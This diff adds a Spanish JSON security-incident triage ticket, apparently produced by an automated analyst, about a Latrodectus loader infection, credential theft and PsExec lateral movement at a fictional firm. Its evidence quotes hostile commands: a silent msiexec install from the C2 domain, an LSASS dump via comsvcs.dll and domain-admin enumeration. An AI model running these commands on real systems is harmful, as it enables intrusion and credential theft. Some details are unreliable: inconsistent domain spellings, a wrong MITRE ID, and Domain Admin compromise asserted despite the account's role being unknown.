@@ -1,0 +1,208 @@
+{
+  "ticket_id": "INC-20261009-WSCN1770-LATROECTUS",
+  "alert_ids": [
+    "ALR-20261009-011791",
+    "EDR-0123400",
+    "EDR-0123401",
+    "EDR-0123402",
+    "EDR-0123403",
+    "EDR-0123404",
+    "EDR-0123405",
+    "EDR-0123406",
+    "EDR-0123407",
+    "EDR-0123408",
+    "EDR-0123409",
+    "EDR-0123410",
+    "EDR-0123411",
+    "EDR-0123412",
+    "EDR-0123413"
+  ],
+  "title": "Cadena de compromiso con Latrodectus en WS-BCN-1770: ejecución, persistencia, C2, robo de credenciales (LSASS) y movimiento lateral a FS01",
+  "verdict": "true_positive",
+  "confidence": 0.98,
+  "severity": "critical",
+  "severity_rationale": "Regla UC-EDR-001 = high. Mayor entidad afectada = identidad crítica (cuentas de Domain Admin/Enterprise Admin comprometidas vía LSASS running as NT AUTHORITY\\SYSTEM) y servidor de dominio (FS01) alcanzado por movimiento lateral PsExec → criticidad Critica. Cruce matrix: regla high × Critica = critical (fila 'high', columna 'Critica'). Sin ajuste hacia abajo: ningun control bloqueo el efecto (EDR action='detected_only' y C2 en proxy con action='allowed'/status=200); la actividad prosiguo tras la deteccion. Sin ajuste arriba adicional: ya en tope 'critical' y politica limita a maximo un ajuste. Interpretacion alternativa (activo primario WS-BCN-1770 criticidad Media: regla high × Media = high; +1 por ejecucion + robo de credenciales confirmado) converge en 'critical'.",
+  "affected": {
+    "users": [
+      "marta.puig@tarvia.example",
+      "adm.aortega@tarvia.example"
+    ],
+    "hosts": [
+      "WS-BCN-1770 (10.10.3.95)",
+      "FS01"
+    ],
+    "business_services": [
+      "Puesto de trabajo (WS-BCN-1770, criticidad Media)"
+    ],
+    "customers": []
+  },
+  "summary": "Compromiso confirmado de WS-BCN-1770 (portatil de la área de Compras) con el loader Latrodectus. Un documento macro (Pedido_Q4_2026.js) lanzo wscript.exe → msiexec que descargo un .msi desde el C2 applihartom.com → se escribio el DLL no firmado upd_x64.dll (TIP=malicioso Latrodectus) y se ejecuto via rundll32. Se instalo persistencia (Run key HKCU\\...\\Run\\Update). Desde ese proceso (pid 8344) se beaconeo a 203.0.113.88:/live/ durante horas (proxy allowed/200, sin bloquear), se enumero el dominio (net group Domain Admins / Enterprise Admins, nltest, adf.exe) y se volcaron credenciales de LSASS como SYSTEM (comsvcs.dll MiniDump). Posteriormente se realizo movimiento lateral PsExec (PSEXESVC) desde WS-BCN-1770 a FS01 usando la cuenta TARVIA\\adm.aortega. No hay cambio autorizado y no hay control que lo haya detenido: compromiso activo en curso.",
+  "evidence": [
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123400",
+      "finding": "wscript.exe ejecuta C:\\Users\\marta.puig\\Downloads\\Pedido_Q4_2026\\Pedido_Q4_2026.js (2026-10-09T09:27:00Z). wscript es binario legitimo de Windows, pero el .js es el vector de entrega."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123401",
+      "finding": "msiexec.exe /q /i https://aplihartom.com/dl/upd.msi (09:27:06Z), padre wscript.exe. Descarga desde C2 malicioso (TIP applihartom.com = Latrodectus, c2/loader)."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123402",
+      "finding": "file_create de upd_x64.dll sha256 0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697 en C:\\Users\\marta.puig\\AppData\\Roaming\\Custom_update\\ (09:27:30Z), sin firmar. TIP = malicioso Latrodectus (loader/dll, conf 75)."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123403",
+      "finding": "rundll32.exe carga upd_x64.dll (09:27:34Z), padre msiexec.exe. Ejecucion confirmada del loader."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123404",
+      "finding": "registry_set persistencia: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update -> rundll32 + upd_x64.dll (09:27:40Z)."
+    },
+    {
+      "source": "proxy",
+      "event_id": "PRX-0211359..PRX-0211418+ (recortado)",
+      "finding": "POST recurrente a https://aplihartom.com/live/ desde 10.10.3.95 (WS-BCN-1770) cada ~1 min desde 09:28:00Z; action=allowed, status=200, dst 203.0.113.88. Beaconing C2 confirmado; NO bloqueado."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123405..EDR-0123411",
+      "finding": "2026-10-10T00:13:00Z, descubrimiento desde rundll32 pid 8344: whoami /all; net group 'Domain Admins' /domain; nltest /dclist:tarvia.local; net view /all /domain; net share; adf.exe enumerando objectcategory=computer; net group 'Enterprise Admins' /domain."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123412",
+      "finding": "2026-10-10T00:22:00Z, robo de credenciales: rundll32 + comsvcs.dll MiniDump 708 -> C:\\ProgramData\\l.dmp sobre lsass.exe (pid 708), ejecutándose como NT AUTHORITY\\SYSTEM, integrity System. Confirmado robo de credenciales (runbook RB-02: proponer reset de cuentas expuestas)."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123413",
+      "finding": "2026-10-10T00:40:04Z, movimiento lateral: service_install PSEXESVC en host FS01 por TARVIA\\adm.aortega, remote_host WS-BCN-1770. PsExec desde el puesto comprometido hacia servidor de dominio usando cuenta privilegiada."
+    },
+    {
+      "source": "t Tip",
+      "event_id": "TIP-aplihartom.com",
+      "finding": "Dominio 203.0.113.88 C2. applihartom.com: TIP reputation maliciosa, conf 85, familia Latrodectus, tags c2/loader."
+    },
+    {
+      "source": "t Tip",
+      "event_id": "TIP-0cfa0bdd",
+      "finding": "upd_x64.dll: TIP malicioso, conf 75, Latrodectus (loader/dll)."
+    },
+    {
+      "source": "t Tip",
+      "event_id": "TIP-6f395de (Pedido_Q4_2026.js)",
+      "finding": "sha256 6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466: SIN coincidencia en TIP = DESCONOCIDO (NO es limpio por defecto)."
+    }
+  ],
+  "enrichment": [
+    {
+      "indicator": "aplihartom.com",
+      "type": "domain",
+      "source": "TIP",
+      "result": "malicious, Latrodectus, c2/loader, conf 85, first_seen 2026-10-03, last_seen 2026-10-15"
+    },
+    {
+      "indicator": "0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+      "type": "sha256",
+      "source": "TIP",
+      "result": "malicious, Latrodectus (loader/dll), conf 75"
+    },
+    {
+      "indicator": "6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+      "type": "sha256",
+      "source": "TIP",
+      "result": "sin coincidencia -> desconocido (no limpiar por defecto)"
+    },
+    {
+      "indicator": "203.0.113.88",
+      "type": "ip",
+      "source": "proxy (destino C2)",
+      "result": "destino de los POST /live/ permitidos; no se obtuvo intel directa por caida de la herramienta"
+    },
+    {
+      "indicator": "WS-BCN-1770 (10.10.3.95)",
+      "type": "host",
+      "source": "CMDB",
+      "result": "A00770, portátil Win11, criticidad Media, zone HQ-USERS, no internet-facing, dueño marta.puig"
+    },
+    {
+      "indicator": "marta.puig@tarvia.example",
+      "type": "user",
+      "source": "Directorio",
+      "result": "Compradora Senior (Compras), account_type user, privileged=false, vip=false, MFA push, cuenta activa"
+    },
+    {
+      "indicator": "Pedido_Q4_2026",
+      "type": "change",
+      "source": "calendario_cambios",
+      "result": "sin cambio aprobado asociado"
+    }
+  ],
+  "mitre": [
+    "T1204.002 (Malicious File)",
+    "T1059.006 (Command and Scripting Interpreter)",
+    "T1218.110 (rundll32)",
+    "T1547.001 (Registry Run Keys)",
+    "T1071 (Application Layer Protocol / C2)",
+    "T1082 (System Information Discovery)",
+    "T1069.002 (Domain Groups: Domain Admins / Enterprise Admins)",
+    "T1003.001 (LSASS Memory Dump)",
+    "T1021.002 (PsExec Lateral Movement)"
+  ],
+  "recommended_actions": [
+    {
+      "action": "Escalar URGENTE por teléfono a N2 de guardia y notificar Responsable SOC + CISO (SLA critical = 15 min)",
+      "target": "incident",
+      "requires_approval": false,
+      "justification": "true_positive critical con ejecución de código malicioso, robo de credenciales y movimiento lateral: criterios de escalado obligatorio."
+    },
+    {
+      "action": "PROPONER aislamiento del equipo WS-BCN-1770 (requiere aprobación N2)",
+      "target": "host",
+      "requires_approval": true,
+      "justification": "Equipo con código Latrodectus activo y C2 en curso; no ejecutar sin aprobación N2."
+    },
+    {
+      "action": "Bloquear IOCs en proxy/correo/EDR: aplihartom.com, 203.0.113.88, sha256 0cfa0bdd... (upd_x64.dll), sha256 6f395de... (Pedido_Q4_2026.js).",
+      "target": "ioc",
+      "requires_approval": false,
+      "justification": "Bloqueo de IOC es acción que el N1 puede ejecutar; se propone, no se ejecuta en este ticket."
+    },
+    {
+      "action": "PROPONER revocar sesiones y forzar cambio de contraseña de marta.puig y adm.aortega (cuentas expuestas por el volcado de LSASS).",
+      "target": "identity",
+      "requires_approval": true,
+      "justification": "Cambio de cuenta privilegiada: requiere aprobación N2."
+    },
+    {
+      "action": "Investigar FS01 (movimiento lateral PsExec con adm.aortega) para confirmar compromiso y evaluar posible salida de datos; si hay datos personales de clientes/empleados, avisar a DPO.",
+      "target": "FS01",
+      "requires_approval": false,
+      "justification": "Servidor de dominio alcanzado; potencial exposición de datos (implica DPO)."
+    },
+    {
+      "action": "Recopilar criticidad oficial de FS01 y rol exacto de adm.aortega cuando la herramienta de CMDB/directorio esté disponible (en este triaje fallaron las consultas).",
+      "target": "cmdb",
+      "requires_approval": false,
+      "justification": "Completar el contexto de la matriz; no altera el veredicto."
+    }
+  ],
+  "escalation": {
+    "escalate": true,
+    "to": "N2 de guardia + Responsable SOC + CISO",
+    "reason": "true_positive critical: ejecución confirmada de código malicioso (Latrodectus), robo de credenciales (LSASS MiniDump como SYSTEM) y movimiento lateral (PsExec a FS01 con cuenta de Domain Admin). Criterios de escalado obligatorio del apartado 5. Escalar por teléfono según SLA critical (15 min)."
+  },
+  "open_questions": [
+    "Criticidad oficial de FS01 (no consultada: herramienta CMDB en error en este triaje).",
+    "Rol y nivel de privilegio exacto de adm.aortega (directorio en error).",
+    "Tráfico C2 adicional no enumerado: la búsqueda de proxy fue recortada (60+ eventos, 'no exhaustiva').",
+    "Firewall y borrado de shadow copies no consultados (herramienta en error en este triaje); no se observó borrado de shadow copies en los eventos EDR disponibles (Latrodectus es RAT, no ransomware)."
+  ],
+  "executed_actions": [],
+  "triage_seconds": 227.12
+}
